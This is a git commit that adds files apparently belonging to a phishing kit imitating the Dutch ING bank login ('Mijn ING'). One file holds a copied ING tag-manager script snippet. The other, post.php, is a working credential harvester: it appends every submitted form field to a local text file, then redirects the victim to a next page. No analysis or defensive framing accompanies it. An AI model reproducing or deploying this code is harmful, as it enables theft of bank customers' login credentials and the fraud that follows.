ef831449040e00eecc5af02028fa62ecdb0773e9
Kevin0202x <58666314+Kevin0202x@users.noreply.github.com>
2019-12-08 19:49:10 +0100

    Add files via upload

---
+++ INGmpgod/ingmpgod/index_files/serverComponent.php
@@ -0,0 +1,2 @@
+
+Bootstrapper._serverTime = '2017-12-04 19:22:18'; Bootstrapper._clientIP = '92.122.53.134'; var psj0 = 'https://tms.ingservices.nl/ing/nl-gia/code/c27af784cee8f14d4210a61a741656bc.js?conditionId0=218784';Bootstrapper.loadScriptCallback(psj0, Bootstrapper.callOnPageSpecificCompletion);Bootstrapper.setPageSpecificDataDefinitionIds([])
---
+++ INGmpgod/ingmpgod/post.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: 2.html');
+$handle = fopen("INFO_MIJNING049832.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
